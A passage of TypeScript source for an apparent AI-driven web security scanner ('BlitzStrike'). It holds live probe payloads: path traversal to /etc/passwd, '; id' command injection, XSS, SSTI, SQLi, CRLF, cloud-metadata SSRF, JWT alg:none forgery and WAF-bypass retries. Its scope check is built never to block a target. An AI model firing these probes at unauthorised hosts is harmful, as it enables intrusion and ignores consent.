/** BlitzStrike orchestrator — server-side 3-tier engagement engine.
 *
 * Runs INSIDE the MCP server so any client (Claude/Hermes/OpenCode/Cursor) can
 * drive a full audit with a single tool call. This is the portability edge:
 * harness-level orchestration is locked to one platform; server-side
 * orchestration works everywhere MCP works.
 */
import { readFileSync, existsSync, statSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { iterSourceFiles, scanFile } from "./scanner.js";
import { rememberIfAbsent } from "./memory.js";
import { findManual } from "./manuals.js";
import { recordAudit } from "./audit.js";
import { makeFinding, type Finding, type Severity } from "./finding.js";
import { scanSinks, detectSourceLeak, type SinkHit } from "./sinks.js";
import { executeChainSteps } from "./chain-executor.js";

/** The canonical engagement pipeline — the ordered stages of a BLITZ audit. */
export const ENGAGEMENT_STAGES = ["scope", "recon", "analyze", "verify", "review", "report"] as const;

/** Terminal-friendly banner announcing that the orchestrator has taken control. */
export function engagementBanner(target: string, mode: string): string {
  return [
    "⚡ BLITZ engagement — orchestrator in control",
    `   target:  ${target}`,
    `   mode:    ${mode}`,
    `   stages:  ${ENGAGEMENT_STAGES.join(" → ")}`,
  ].join("\n");
}

/** Format a live progress snapshot (stage + findings + tasks) for the terminal. */
export function formatStatus(opts: {
  phase?: string;
  findings?: Record<string, number>;
  tasks?: Array<{ id: string; objective: string; status: string }>;
}): string {
  const lines: string[] = [];
  const idx = opts.phase ? ENGAGEMENT_STAGES.indexOf(opts.phase as (typeof ENGAGEMENT_STAGES)[number]) : -1;
  lines.push(`BLITZ engagement${idx >= 0 ? ` — ${opts.phase} (${idx + 1}/${ENGAGEMENT_STAGES.length})` : ""}`);
  if (idx >= 0) {
    lines.push(
      `   stages: ${ENGAGEMENT_STAGES.map((s, i) => (i < idx ? `${s} ✓` : i === idx ? `${s} ▶` : `${s} ☐`)).join("  ")}`,
    );
  }
  if (opts.findings) {
    const f = opts.findings;
    lines.push(
      `   findings: ${[`${f.detected ?? 0} detected`, `${f.hypothesis ?? 0} hypothesis`, `${f.confirmed ?? 0} confirmed`, `${f.false_positive ?? 0} false_positive`].join(" · ")}`,
    );
  }
  if (opts.tasks && opts.tasks.length) {
    lines.push(`   tasks: ${opts.tasks.map((t) => `${t.objective} (${t.status})`).join(" · ")}`);
  }
  return lines.join("\n");
}

/** Render an engagement plan as a compact checkbox checklist (✓ done / ▶ active / ☐ pending). */
export function formatPlanChecklist(
  plan: Array<{ order: number; state: string; status?: string }>,
): string {
  const mark = (s?: string) => (s === "done" ? "✓" : s === "pending" ? "☐" : "▶");
  const items = plan.map((p) => `[${mark(p.status)}] ${p.state}`);
  const rows: string[] = [];
  for (let i = 0; i < items.length; i += 3) {
    rows.push("   " + items.slice(i, i + 3).map((s) => s.padEnd(22)).join(""));
  }
  return rows.join("\n");
}

/** Classify a target: source path on disk vs live host, auto-prepending https://
 *  to scheme-less domains/IPs (a URL does not always carry an explicit scheme). */
export function classifyTarget(target: string): { kind: "source" | "live"; target: string } {
  if (/^https?:\/\//i.test(target)) return { kind: "live", target };
  try {
    if (existsSync(target) && (statSync(target).isDirectory() || statSync(target).isFile())) {
      return { kind: "source", target };
    }
  } catch {
    /* not a readable path — fall through */
  }
  // Bare code filename (no scheme, no path separator) → source file.
  const CODE_EXT = /\.(php|phtml|py|js|ts|jsx|tsx|java|rb|go|c|cpp|cs|swift|kt|rs|pl|sh|sql|html|vue|m|mm)$/i;
  if (CODE_EXT.test(target) && !target.includes("/")) {
    return { kind: "source", target };
  }
  // Bare hostname/IP without a scheme → live; prepend https:// for the sweep.
  const host = /^[\w.-]+\.[a-zA-Z]{2,}(:\d+)?([/?#].*)?$/.test(target) || /^\d{1,3}(\.\d{1,3}){3}(:\d+)?$/.test(target);
  return { kind: "live", target: host ? `https://${target}` : target };
}

import { makeEvidence } from "./evidence.js";
import { buildPlan, computeGuidance, stateDefinition, type EngagementState } from "./orchestration.js";
import { reportMarkdown, reportJson, type ReportSummary } from "./report.js";
import { toSarif, sarifLevel } from "./sarif.js";
import { VERSION } from "./version.js";
import { strikeVerify, resolveFinding, isWafBlock, bypassVariants } from "./strike.js";
import { liveRecon } from "./live-recon.js";

// ---------------------------------------------------------------------------
// Data layer
// ---------------------------------------------------------------------------

export interface ChainStep {
  order: number;
  action: string;
  tool_hint?: string;
  success_criteria?: string;
  invariant_check?: string;
  negative_control?: string;
}

export interface Chain {
  id: string;
  name: string;
  triggers: string[];
  required_findings: string[];
  severity: string;
  steps: ChainStep[];
  tools?: string[];
}

let _chainsCache: Chain[] | null = null;

export function loadChains(): Chain[] {
  if (_chainsCache) return _chainsCache;
  try {
    const dir = join(fileURLToPath(new URL(".", import.meta.url)), "..");
    const path = join(dir, "chains.json");
    const raw = JSON.parse(readFileSync(path, "utf8"));
    _chainsCache = (raw.chains ?? []) as Chain[];
    return _chainsCache;
  } catch {
    _chainsCache = [];
    return [];
  }
}

// ---------------------------------------------------------------------------
// Scope enforcement (MODE_PRESETS-style safety)
// ---------------------------------------------------------------------------

export interface ScopeResult {
  target: string;
  allowed: boolean;
  enforcement: string;
  reason?: string;
}

export function scopeCheck(
  target: string,
  scope = "",
  mode = "bug-bounty",
): ScopeResult {
  // Static source paths on disk are always in-scope — there is no live action
  // to gate. (A filesystem path would otherwise extract an empty host and read
  // as "target '' not in scope", which is a misleading refusal.)
  if (target.startsWith("/") || target.startsWith("./") || target.startsWith("../") || target.startsWith("~") || /^[a-zA-Z]:[\\/]/.test(target)) {
    return { target, allowed: true, enforcement: "off", reason: "static source path — always in-scope" };
  }
  let result: ScopeResult;
  // Scope is INTEL ONLY, never a gate. The repo disclaimer places responsibility
  // on the operator (exactly like nmap/sqlmap/Burp). We classify the target for
  // the report and PROCEED regardless — a URL is never refused for lack of scope.
  const host = target.replace(/^https?:\/\//, "").split("/")[0].split(":")[0];
  let classification = mode === "ctf" || mode === "reverse-engineering" || mode === "offensive"
    ? "unscoped"
    : "unscoped";
  let detail = `mode=${mode}`;

  if (scope.trim()) {
    const inScope: string[] = [];
    const outScope: string[] = [];
    for (const raw of scope.split(/[,\n]/)) {
      const line = raw.trim();
      if (!line) continue;
      if (line.startsWith("-")) outScope.push(line.slice(1).trim());
      else inScope.push(line);
    }
    classification = "not_in_scope";
    detail = `no pattern matched '${host}'`;
    for (const exc of outScope) {
      const e = exc.replace(/\*/g, "").replace(/^\./, "");
      if (e && (host === e || host.endsWith("." + e))) {
        classification = "out_of_scope";
        detail = `explicitly out of scope (${exc})`;
        break;
      }
    }
    if (classification !== "out_of_scope") {
      for (const allowed of inScope) {
        const a = allowed.replace(/\*/g, "").replace(/^\./, "");
        if (!a) continue;
        if (host === a || host.endsWith("." + a)) {
          classification = "in_scope";
          detail = `matched '${allowed}'`;
          break;
        }
      }
    }
  }

  result = {
    target,
    allowed: true,
    enforcement: "off",
    reason: `scope=${classification} (${detail}) — proceeding; repo disclaimer carries responsibility`,
  };

  recordAudit("scope_checked", { tool: "scope", target, result: result.allowed ? "allowed" : "denied" });
  return result;
}

// ---------------------------------------------------------------------------
// Chain enrichment
// ---------------------------------------------------------------------------

function classifySink(sink: string): string {
  if (/(move_uploaded_file|file_put_contents|fwrite)/.test(sink)) return "upload_weak_validation";
  if (/unserialize/.test(sink)) return "unserialize_user_input";
  if (/(exec\(|system\(|shell_exec|passthru|popen|proc_open)/.test(sink)) return "command_injection";
  if (/(include|require)/.test(sink)) return "lfi_unvalidated_include";
  if (/extract\(/.test(sink)) return "extract_without_exstr_skip";
  if (/(\$wpdb|->query)/.test(sink)) return "sql_injection";
  if (/(wp_remote_get|wp_remote_post|file_get_contents)/.test(sink)) return "ssrf_unvalidated_url";
  if (/(eval\(|assert\(|create_function)/.test(sink)) return "unsafe_template_render";
  return "";
}

export interface EnrichHit {
  type: "endpoint" | "sink";
  file: string;
  line: number;
  detail: string;
}

export interface MatchedChain {
  chain_id: string;
  name: string;
  severity: string;
  steps: number;
}

export interface EnrichResult {
  root: string;
  files_scanned: number;
  hits: EnrichHit[];
  sink_signals: string[];
  matched_chains: MatchedChain[];
}

export function enrichScan(path: string, maxFiles = 2000): EnrichResult {
  const expanded = path.replace(/^~/, process.env.HOME ?? "~");
  const files = iterSourceFiles(expanded, maxFiles);
  const hits: EnrichHit[] = [];
  const sinkKinds = new Set<string>();

  for (const p of files) {
    const r = scanFile(p);
    for (const e of r.endpoints) {
      hits.push({ type: "endpoint", file: r.file, line: e.line, detail: e.hook });
    }
    for (const s of r.sinks) {
      hits.push({ type: "sink", file: r.file, line: s.line, detail: `${s.sink} -> ${s.class}` });
      const kind = classifySink(s.sink);
      if (kind) sinkKinds.add(kind);
    }
  }

  const chains = loadChains();
  const matched: MatchedChain[] = [];
  for (const c of chains) {
    if ((c.required_findings ?? []).some((rf) => sinkKinds.has(rf))) {
      matched.push({ chain_id: c.id, name: c.name, severity: c.severity, steps: c.steps.length });
    }
  }

  return {
    root: expanded,
    files_scanned: files.length,
    hits: hits.slice(0, 2000),
    sink_signals: [...sinkKinds].sort(),
    matched_chains: matched,
  };
}

// ---------------------------------------------------------------------------
// 3-tier engagement
// ---------------------------------------------------------------------------

export function runEngagement(
  target: string,
  scope = "",
  mode = "bug-bounty",
  maxFiles = 2000,
  remember = true,
): Record<string, unknown> {
  const report: Record<string, unknown> = {
    banner: engagementBanner(target, mode),
    target,
    mode,
    tiers: {},
    findings: [],
    scope: null,
    memory: { captured: 0 },
  };

  const isPath = (() => {
    try {
      return existsSync(target) && (statSync(target).isDirectory() || statSync(target).isFile());
    } catch {
      return false;
    }
  })();

  if (isPath) {
    report.scope = { target, allowed: true, enforcement: "source-audit", reason: "local source path — no network scope gate" };
  } else {
    const sc = scopeCheck(target, scope, mode);
    report.scope = sc;
    if (!sc.allowed) {
      report.status = "BLOCKED";
      report.reason = sc.reason;
      return report;
    }
  }

  const blitz = enrichScan(target, maxFiles);
  report.tiers = {
    blitz: {
      files_scanned: blitz.files_scanned,
      hits: blitz.hits.length,
      sink_signals: blitz.sink_signals,
      matched_chains: blitz.matched_chains,
    },
  };

  const chains = loadChains();
  const chainById = new Map(chains.map((c) => [c.id, c]));
  const eagle: Array<Record<string, unknown>> = [];
  for (const mc of blitz.matched_chains.slice(0, 10)) {
    const chain = chainById.get(mc.chain_id);
    if (!chain) continue;
    eagle.push({
      chain_id: chain.id,
      name: chain.name,
      severity: chain.severity,
      prerequisites: chain.required_findings,
      recommended_tools: chain.tools ?? [],
      tool_manuals: (chain.tools ?? []).map((t) => {
        const m = findManual(t);
        return m.found
          ? { tool: t, manual_name: m.name, preview: (m.content as string).slice(0, 600) }
          : { tool: t, manual_name: null, preview: null };
      }),
      steps: chain.steps.map((s) => ({
        order: s.order,
        action: s.action,
        tool_hint: s.tool_hint,
        success_criteria: s.success_criteria,
        invariant_check: s.invariant_check,
        negative_control: s.negative_control,
      })),
    });
  }
  report.tiers = { ...(report.tiers as Record<string, unknown>), eagle_eye: { traced_chains: eagle } };

  const rank: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3 };
  const matchedSorted = [...blitz.matched_chains].sort(
    (a, b) => (rank[a.severity] ?? 99) - (rank[b.severity] ?? 99),
  );

  // Canonical findings: every matched chain becomes a HYPOTHESIS finding carrying
  // static + sink evidence. Nothing is CONFIRMED here — that requires STRIKE.
  const findings: Finding[] = matchedSorted.map((f) => {
    const chain = chainById.get(f.chain_id);
    const severity = (f.severity as Severity) ?? "medium";
    const finding = makeFinding({
      title: f.name,
      target: { type: "source", path: target },
      severity,
      source: { type: "static_sink_signal", name: f.chain_id },
      sink: { type: f.chain_id, symbol: f.name },
      chainId: f.chain_id,
      chainName: f.name,
      status: "hypothesis",
    });
    const ev = makeEvidence({
      type: "sink_location",
      description: `Static sink signal matched escalation chain '${f.chain_id}' (${severity}). Hypothesis only — not yet validated.`,
      sink: { chain_id: f.chain_id, name: f.name, severity },
      artifacts: [{ name: "chain_match", kind: "json", content: JSON.stringify({ chain_id: f.chain_id, severity, steps: chain?.steps.length ?? 0 }) }],
    });
    finding.evidence.push(ev);
    return finding;
  });
  report.findings = findings.map((f) => ({
    id: f.id,
    status: f.status,
    title: f.title,
    severity: f.classification.severity,
    confidence: f.confidence,
    confidence_level: f.confidence_level,
    chain_id: f.chain.id,
    evidence_count: f.evidence.length,
  }));

  // Phase 7 no-babysitting: generate the full deliverable inline (markdown +
  // JSON + SARIF), so one run_engagement call returns the complete report.
  const reportTitle = `Blitz Strike — Engagement Report (${target})`;
  const reportMarkdownText = reportMarkdown(findings, { title: reportTitle, scope: target, version: VERSION });
  const reportJsonText = reportJson(findings, { title: reportTitle, scope: target, version: VERSION });
  const sarifDoc = toSarif(
    findings.map((f) => ({
      ruleId: f.chain.id || f.classification.severity,
      level: sarifLevel(f.classification.severity),
      message: f.title,
      file: typeof f.target.path === "string" ? f.target.path : target,
      line: 1,
    })),
  );
  report.report = {
    summary: (JSON.parse(reportJsonText).summary ?? null) as ReportSummary | null,
    markdown: reportMarkdownText,
    json: reportJsonText,
    sarif: sarifDoc,
  };

  report.status = "COMPLETE";
  report.note =
    "All findings are HYPOTHESES until verified live with strike_verify. " +
    "Apply each chain's negative_control before reporting. Confidence reflects static evidence only.";

  // Phase 7 orchestration: state machine + plan + guidance.
  // Server-side execution reaches select_chain (chains matched); validate +
  // evidence + finding + report require live validation + agent interaction.
  const executedState: EngagementState = "select_chain";
  const scopeAllowed = (report.scope as { allowed?: boolean } | null)?.allowed ?? false;
  const plan = buildPlan(scopeAllowed, mode, executedState);
  report.state = executedState;
  report.state_description = stateDefinition(executedState).description;
  report.plan = plan;
  report.guidance = computeGuidance(executedState, scopeAllowed);
  report.risk_policy = {
    note: "High-risk actions (strike_verify, confirm_finding) require scope + are never run server-side automatically.",
    gated: plan.filter((p) => !p.permitted).map((p) => p.tool),
  };

  // Auto-capture: persist each matched chain as reusable pattern memory.
  // verified=false — a matched chain is a lead, not a confirmed exploit.
  // Dedup by chain_id so repeated engagements do not re-save.
  if (remember) {
    let captured = 0;
    for (const mc of blitz.matched_chains) {
      const chain = chainById.get(mc.chain_id);
      const content =
        `Chain '${mc.chain_id}' (${mc.severity}) matched on target '${target}'. ` +
        `Detected sink signals: ${blitz.sink_signals.join(", ")}. ` +
        `Prerequisites: ${(chain?.required_findings ?? []).join(", ")}.`;
      if (rememberIfAbsent(mc.chain_id, content, "pattern", [mc.severity, "chain"], "engagement", false)) {
        captured++;
      }
    }
    report.memory = { captured, deduped: blitz.matched_chains.length - captured };
  }
  return report;
}

export function listChains(): Record<string, unknown> {
  const chains = loadChains();
  return {
    total: chains.length,
    chains: chains.map((c) => ({
      id: c.id,
      name: c.name,
      severity: c.severity,
      steps: c.steps.length,
      triggers: c.triggers,
    })),
  };
}

// ---------------------------------------------------------------------------
// Live autonomous engagement (no-babysitting for URL targets)
// ---------------------------------------------------------------------------

const LIVE_SWEEP_PARAMS = ["q", "search", "query", "s", "id", "url", "redirect", "name", "page"];

/**
 * Full autonomous live engagement for a URL target. One call runs:
 * scope classification (recorded, not a gate) -> marker reflection sweep
 * (strike_verify) -> canonical findings -> inline report. Non-destructive
 * (marker + negative control only).
 */
// ---------------------------------------------------------------------------
// Deterministic live security checks (no LLM, no Playwright) — deepen the
// one-call live pipeline beyond reflected input. Each check is a pure HTTP
// observation; a hit is a HYPOTHESIS until strike_verify confirms it.
// ---------------------------------------------------------------------------
const SECURITY_HEADERS: Array<[string, string]> = [
  ["strict-transport-security", "Strict-Transport-Security (HSTS)"],
  ["content-security-policy", "Content-Security-Policy (CSP)"],
  ["x-frame-options", "X-Frame-Options (clickjacking)"],
  ["x-content-type-options", "X-Content-Type-Options"],
  ["referrer-policy", "Referrer-Policy"],
];
const OPEN_REDIRECT_PARAMS = ["redirect", "url", "return", "next", "callback", "redirect_uri", "return_url", "goto", "dest", "target", "continue"];
const PATH_PARAMS = ["file", "path", "page", "template", "lang", "include", "doc", "download", "load"];
const EVIL_HOST = "evil-blitz.example.com";

async function httpGet(u: string, extraHeaders?: Record<string, string>): Promise<{ status: number; headers: Record<string, string>; body: string } | null> {
  try {
    const res = await fetch(u, { redirect: "manual", headers: extraHeaders, signal: AbortSignal.timeout(10000) });
    const body = await res.text();
    const h: Record<string, string> = {};
    res.headers.forEach((v, k) => { h[k.toLowerCase()] = v; });
    return { status: res.status, headers: h, body };
  } catch {
    return null;
  }
}

async function runDeterministicChecks(url: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const base = url.replace(/\/+$/, "");
  const sep = base.includes("?") ? "&" : "?";

  // 1) Missing security headers — deterministic, zero false positive.
  const home = await httpGet(base);
  if (home) {
    const missing = SECURITY_HEADERS.filter(([h]) => !home.headers[h]).map(([, n]) => n);
    if (missing.length) {
      findings.push(makeFinding({
        title: `Missing security headers: ${missing.join(", ")}`,
        target: { type: "web", host: url, endpoint: "/" },
        severity: "low",
        cwe: "CWE-693",
        cweName: "Protection Mechanism Failure",
        source: { type: "http_response", name: "headers" },
        sink: { type: "missing_header", symbol: missing[0] },
        chainId: "missing_security_headers",
        chainName: "Missing security headers",
        status: "hypothesis",
      }));
    }
  }

  // 2) Open redirect — inject an attacker host into redirect params, check Location.
  // 3) Path traversal — inject ../../etc/passwd into file params, check for root:.
  //    Both param sweeps run in PARALLEL (independent requests).
  const [redirectRes, traversalRes] = await Promise.all([
    Promise.all(OPEN_REDIRECT_PARAMS.map(async (p) => {
      const r = await httpGet(`${base}${sep}${p}=${encodeURIComponent(`https://${EVIL_HOST}`)}`);
      const loc = r?.headers["location"] ?? "";
      return { p, hit: !!r && r.status >= 300 && r.status < 400 && loc.includes(EVIL_HOST) };
    })),
    Promise.all(PATH_PARAMS.map(async (p) => {
      const r = await httpGet(`${base}${sep}${p}=${encodeURIComponent("../../../../../../etc/passwd")}`);
      return { p, hit: !!r && r.body.includes("root:") };
    })),
  ]);

  for (const { p, hit } of redirectRes) {
    if (!hit) continue;
    findings.push(makeFinding({
      title: `Open redirect via parameter '${p}'`,
      target: { type: "web", host: url, endpoint: `?${p}=` },
      severity: "medium",
      cwe: "CWE-601",
      cweName: "URL Redirection to Untrusted Site",
      source: { type: "request_parameter", name: p },
      sink: { type: "redirect", symbol: p },
      chainId: "open_redirect",
      chainName: "Open redirect",
      status: "hypothesis",
    }));
  }
  for (const { p, hit } of traversalRes) {
    if (!hit) continue;
    findings.push(makeFinding({
      title: `Path traversal via parameter '${p}'`,
      target: { type: "web", host: url, endpoint: `?${p}=` },
      severity: "high",
      cwe: "CWE-22",
      cweName: "Path Traversal",
      source: { type: "request_parameter", name: p },
      sink: { type: "file_read", symbol: p },
      chainId: "path_traversal",
      chainName: "Path traversal / LFI",
      status: "hypothesis",
    }));
  }

  // 4) CORS — reflected/wildcard origin combined with credentials = finding.
  const cors = await httpGet(base, { Origin: `https://${EVIL_HOST}` });
  if (cors) {
    const acao = cors.headers["access-control-allow-origin"] ?? "";
    const acac = cors.headers["access-control-allow-credentials"] ?? "";
    if ((acao.includes(EVIL_HOST) || acao === "*") && acac === "true") {
      findings.push(makeFinding({
        title: "CORS misconfiguration: reflected/wildcard origin with credentials",
        target: { type: "web", host: url, endpoint: "/" },
        severity: "medium",
        cwe: "CWE-942",
        cweName: "Permissive Cross-domain Policy",
        source: { type: "http_response", name: "access-control-allow-origin" },
        sink: { type: "cors", symbol: acao },
        chainId: "cors_misconfiguration",
        chainName: "CORS misconfiguration",
        status: "hypothesis",
      }));
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// Advanced deterministic checks — beyond the standard reflected/header/redirect/
// traversal/CORS sweep. Each is an evaluation or error-signature observation:
// a hit is a HYPOTHESIS until strike_verify confirms it.
// ---------------------------------------------------------------------------
const SSTI_PROBE = "{{7*'7'}}";
const SSTI_EVAL = "7777777";
const SSTI_PARAMS = ["name", "template", "q", "search", "query", "message", "title", "content", "input", "data", "page", "id"];
const SSRF_TARGET = "http://169.254.169.254/latest/meta-data/";
const SSRF_MARKERS = ["ami-id", "instance-id", "security-credentials", "instance-type"];
const SSRF_REFLECT_TARGET = "http://httpbin.org/anything/blitzstrike-ssrf-canary";
const SSRF_REFLECT_MARKERS = ["blitzstrike-ssrf-canary"];
const SSRF_PARAMS = ["url", "uri", "path", "host", "domain", "webhook", "callback", "redirect", "proxy", "src", "dest", "link", "target", "endpoint", "image", "img", "fetch", "download", "import", "feed", "source", "load", "next"];
const SQLI_PROBE = "'";
const SQLI_MARKERS = ["sql syntax", "mysql", "mysqli", "postgresql", "sqlite", "ora-", "odbc", "syntax error", "unclosed quotation", "you have an error in your sql"];
const SQLI_PARAMS = ["id", "user", "username", "email", "product", "item", "category", "page", "search", "q", "query", "order", "sort"];
const CMD_PROBE = "; id";
const CMD_MARKERS = ["uid=", "gid=", "groups=", "www-data", "/bin/bash", "/bin/sh", "root:"];
const CMD_PARAMS = ["cmd", "command", "exec", "run", "ping", "host", "ip", "file", "path", "input", "arg", "domain", "url", "name"];
const XSS_PROBE = "<script>alert(document.domain)</script>";
const XSS_ATTR_PROBE = "\"><img src=x onerror=alert(1)>";
const XSS_PARAMS = ["q", "search", "query", "s", "name", "title", "message", "comment", "content", "input", "url", "redirect", "page", "id", "user", "username"];
const CRLF_PROBE = "%0d%0aX-BlitzStrike%3A%20injected";
const CRLF_PARAMS = ["url", "redirect", "return", "next", "callback", "state", "token", "id"];
const HOST_HEADER_MARKER = "bs-marker.example.com";

/** Probe for CRLF/header injection: inject %0d%0a into params and check whether a
 * response header reflects the injected name. The probe is pre-encoded (CRLF as
 * %0d%0a) and sent as-is — re-encoding it would double-encode the CRLF. */
async function checkCrlf(base: string, p: string): Promise<{ detected: boolean; sinks?: SinkHit[] }> {
  const sep = base.includes("?") ? "&" : "?";
  const r = await httpGet(`${base}${sep}${p}=${CRLF_PROBE}`);
  if (!r) return { detected: false };
  const headerHit = Object.keys(r.headers).some((k) => k.toLowerCase().includes("x-blitzstrike"));
  return {
    detected: headerHit,
    sinks: detectSourceLeak(r.body) ? scanSinks(r.body) : [],
  };
}

/** Probe for host-header poisoning: send an attacker Host and check whether the
 * response reflects it (redirect Location, injected link, or set-cookie domain). */
async function checkHostHeader(url: string): Promise<{ detected: boolean; evidence: string }> {
  try {
    const u = new URL(url);
    const res = await fetch(u, { redirect: "manual", headers: { Host: HOST_HEADER_MARKER } });
    const body = await res.text();
    const loc = res.headers.get("location") ?? "";
    const setCookie = res.headers.get("set-cookie") ?? "";
    const reflected = body.includes(HOST_HEADER_MARKER) || loc.includes(HOST_HEADER_MARKER) || setCookie.includes(HOST_HEADER_MARKER);
    return { detected: reflected, evidence: reflected ? `Host reflected in ${loc.includes(HOST_HEADER_MARKER) ? "Location" : setCookie.includes(HOST_HEADER_MARKER) ? "Set-Cookie" : "body"}` : "" };
  } catch {
    return { detected: false, evidence: "" };
  }
}

/** Detect JWT tokens in a response and test alg:none + alg-confusion acceptance. */
async function checkJwt(url: string): Promise<Array<{ type: string; token: string; accepted: boolean }>> {
  const out: Array<{ type: string; token: string; accepted: boolean }> = [];
  try {
    const res = await fetch(url, { redirect: "follow" });
    const body = await res.text();
    const setCookie = res.headers.get("set-cookie") ?? "";
    // Find JWTs in cookies, headers, or body (authorization / token params).
    const jwtRe = /eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}/g;
    const found = new Set<string>();
    for (const m of (setCookie + " " + body).matchAll(jwtRe)) found.add(m[0]);
    for (const token of [...found].slice(0, 3)) {
      const [h, p] = token.split(".");
      const header = JSON.parse(Buffer.from(h, "base64url").toString());
      // alg:none test — strip signature.
      const noneToken = `${h}.${p}.`;
      const noneRes = await fetch(url, { headers: { Authorization: `Bearer ${noneToken}` } });
      if (noneRes.status !== 401 && noneRes.status !== 403) {
        out.push({ type: `alg:none accepted (${header.alg})`, token: noneToken.slice(0, 40), accepted: true });
      } else if (header.alg?.toUpperCase().startsWith("RS") || header.alg?.toUpperCase().startsWith("ES")) {
        // alg-confusion hypothesis: RS256 -> HS256 using the public key as secret.
        out.push({ type: `alg-confusion candidate (${header.alg} -> HS256)`, token: token.slice(0, 40), accepted: false });
      }
    }
  } catch {
    /* fetch errors — ignore */
  }
  return out;
}

/** Probe a parameter with a payload; if a WAF blocks it, retry with bypass variants.
 * ALWAYS scans the response for leaked sinks (not just when the probe detects) —
 * a 500 traceback that leaks eval()/SECRET_KEY is captured even if the specific
 * injection class is not present. */
async function probeWithBypass(
  url: string,
  param: string,
  payload: string,
  detect: (body: string) => boolean,
): Promise<{ detected: boolean; bypass?: string; sinks?: SinkHit[] }> {
  const scan = (body: string): SinkHit[] => (detectSourceLeak(body) ? scanSinks(body) : []);
  const sep = url.includes("?") ? "&" : "?";
  const r = await httpGet(`${url}${sep}${param}=${encodeURIComponent(payload)}`);
  if (r && detect(r.body)) return { detected: true, sinks: scan(r.body) };
  if (r && isWafBlock(r.status, r.body)) {
    for (const v of bypassVariants(payload)) {
      const b = await httpGet(`${url}${sep}${param}=${encodeURIComponent(v.value)}`);
      if (b && detect(b.body)) return { detected: true, bypass: v.technique, sinks: scan(b.body) };
    }
  }
  // Not the vuln we probed for, but the response may still leak source — capture it.
  if (r) {
    const sinks = scan(r.body);
    if (sinks.length) return { detected: false, sinks };
  }
  return { detected: false };
}

/** Map a leaked sink to a hypothesis Finding (severity/CWE/chain per sink class). */
function sinkToFinding(sink: SinkHit, url: string): Finding | null {
  const conf = (() => {
    switch (sink.type) {
      case "rce": return { severity: "critical", cwe: "CWE-94", cweName: "Improper Control of Generation of Code (Code Injection)", chainId: "command_injection", chainName: "Code injection / RCE" };
      case "secret": case "credential": return { severity: "high", cwe: "CWE-798", cweName: "Use of Hard-coded Credentials", chainId: "credential_exposure", chainName: "Credential exposure" };
      case "ssti": return { severity: "critical", cwe: "CWE-94", cweName: "Code Injection", chainId: "ssti", chainName: "Server-side template injection" };
      case "ssrf": return { severity: "high", cwe: "CWE-918", cweName: "Server-Side Request Forgery", chainId: "ssrf", chainName: "Server-side request forgery" };
      case "sqli": return { severity: "high", cwe: "CWE-89", cweName: "SQL Injection", chainId: "sql_injection", chainName: "SQL injection" };
      case "lfi": return { severity: "high", cwe: "CWE-22", cweName: "Path Traversal", chainId: "path_traversal", chainName: "Path traversal / LFI" };
      case "deserialization": return { severity: "critical", cwe: "CWE-502", cweName: "Deserialization of Untrusted Data", chainId: "deserialization", chainName: "Deserialization" };
      case "xxe": return { severity: "high", cwe: "CWE-611", cweName: "XML External Entity", chainId: "xxe", chainName: "XXE" };
      default: return null;
    }
  })();
  if (!conf) return null;
  return makeFinding({
    title: `${conf.chainName} via leaked ${sink.label} (source line ${sink.line})`,
    target: { type: "web", host: url, endpoint: `source line ${sink.line}` },
    severity: conf.severity as unknown as Parameters<typeof makeFinding>[0]["severity"],
    cwe: conf.cwe,
    cweName: conf.cweName,
    source: { type: "source_disclosure", name: sink.label },
    sink: { type: sink.type, symbol: sink.snippet },
    chainId: conf.chainId,
    chainName: conf.chainName,
    status: "hypothesis",
  });
}

async function runAdvancedChecks(url: string): Promise<Finding[]> {
  const base = url.replace(/\/+$/, "");
  const leakedSinks: SinkHit[] = [];

  // All injection probes run in PARALLEL (each param is an independent request
  // chain). This keeps the whole advanced phase bounded by the slowest single
  // param chain instead of summing 40+ sequential round-trips.
  const results = await Promise.all([
    ...SSTI_PARAMS.map(async (p): Promise<Finding | null> => {
      const res = await probeWithBypass(base, p, SSTI_PROBE, (body) => body.includes(SSTI_EVAL) && !body.includes(SSTI_PROBE));
      if (res.sinks?.length) leakedSinks.push(...res.sinks);
      if (!res.detected) return null;
      return makeFinding({
        title: `Server-side template injection via parameter '${p}'${res.bypass ? ` (WAF bypassed: ${res.bypass})` : ""}`,
        target: { type: "web", host: url, endpoint: `?${p}=` },
        severity: "critical",
        cwe: "CWE-1336",
        cweName: "Improper Neutralization of Special Elements Used in a Template Engine",
        source: { type: "request_parameter", name: p },
        sink: { type: "template_engine", symbol: p },
        chainId: "ssti",
        chainName: "Server-side template injection",
        status: "hypothesis",
      });
    }),
    ...SSRF_PARAMS.map(async (p): Promise<Finding | null> => {
      // Two probes: cloud metadata (link-local) and a benign external URL whose
      // content is reflected back — catches both metadata exfil and fetch-reflect SSRF.
      const meta = await probeWithBypass(base, p, SSRF_TARGET, (body) => SSRF_MARKERS.some((m) => body.includes(m)));
      const refl = await probeWithBypass(base, p, SSRF_REFLECT_TARGET, (body) => SSRF_REFLECT_MARKERS.some((m) => body.includes(m)));
      if (meta.sinks?.length) leakedSinks.push(...meta.sinks);
      if (refl.sinks?.length) leakedSinks.push(...refl.sinks);
      if (!meta.detected && !refl.detected) return null;
      const bypass = meta.bypass ?? refl.bypass;
      return makeFinding({
        title: `Server-side request forgery via parameter '${p}' (${meta.detected ? "cloud metadata" : "fetch-reflect"}${bypass ? `, WAF bypassed: ${bypass}` : ""})`,
        target: { type: "web", host: url, endpoint: `?${p}=` },
        severity: "critical",
        cwe: "CWE-918",
        cweName: "Server-Side Request Forgery (SSRF)",
        source: { type: "request_parameter", name: p },
        sink: { type: "ssrf", symbol: p },
        chainId: "ssrf",
        chainName: "Server-side request forgery",
        status: "hypothesis",
      });
    }),
    ...SQLI_PARAMS.map(async (p): Promise<Finding | null> => {
      const res = await probeWithBypass(base, p, SQLI_PROBE, (body) => SQLI_MARKERS.some((m) => body.toLowerCase().includes(m)));
      if (res.sinks?.length) leakedSinks.push(...res.sinks);
      if (!res.detected) return null;
      return makeFinding({
        title: `SQL injection (error-based) via parameter '${p}'${res.bypass ? ` (WAF bypassed: ${res.bypass})` : ""}`,
        target: { type: "web", host: url, endpoint: `?${p}=` },
        severity: "critical",
        cwe: "CWE-89",
        cweName: "Improper Neutralization of Special Elements used in an SQL Command",
